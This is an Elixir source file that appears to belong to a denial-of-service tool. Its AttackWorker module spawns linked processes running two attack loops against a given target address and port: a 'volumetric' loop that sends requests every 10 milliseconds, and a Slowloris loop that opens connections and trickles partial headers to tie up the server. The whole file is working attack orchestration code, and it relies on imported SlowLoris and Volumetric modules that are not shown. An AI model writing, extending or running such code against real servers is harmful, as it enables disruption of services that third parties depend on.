defmodule AttackWorker do
  require Logger
  import SlowLoris
  import Volumetric

  # Worker module for attacks.

  # Spawns the volumetric worker process and links it to the calling process
  def start_link("volumetric", target_address, target_port) do
    spawn_link(fn -> volumetric_loop(target_address, target_port) end)
  end

  # Spawns the slowloris worker process and links it to the calling process
  def start_link("slowloris", target_address, target_port, transmission_interval) do
    spawn_link(fn -> slowloris_loop(target_address, target_port, transmission_interval, nil) end)
  end

  def volumetric_loop(target_address, target_port) do
    Volumetric.send_request(target_address, target_port)

    receive do
      :stop_attack ->
        :ok

    after
      10 ->
        volumetric_loop(target_address, target_port)
    end
  end

  def slowloris_loop(target_address, target_port, transmission_interval, socket) do
    updated_socket = slowloris_step(target_address, target_port, transmission_interval, socket)

    receive do
      :stop_attack ->
        Logger.info("#{inspect self()} - Stopping attack")
        :ok

    after
      10 ->
        slowloris_loop(target_address, target_port, transmission_interval, updated_socket)
    end

  end

  defp slowloris_step(target_address, target_port, transmission_interval, socket) do
    if socket == nil do
      case SlowLoris.start_connection(target_address, target_port) do
        :error ->
          nil

        socket ->
          socket
      end
    else
      Process.sleep(transmission_interval)
      case SlowLoris.send_header(socket) do
        :ok ->
          socket

        :error ->
          nil
      end
    end
  end

  def stop(pid) do
    send(pid, :stop_attack)
  end
end
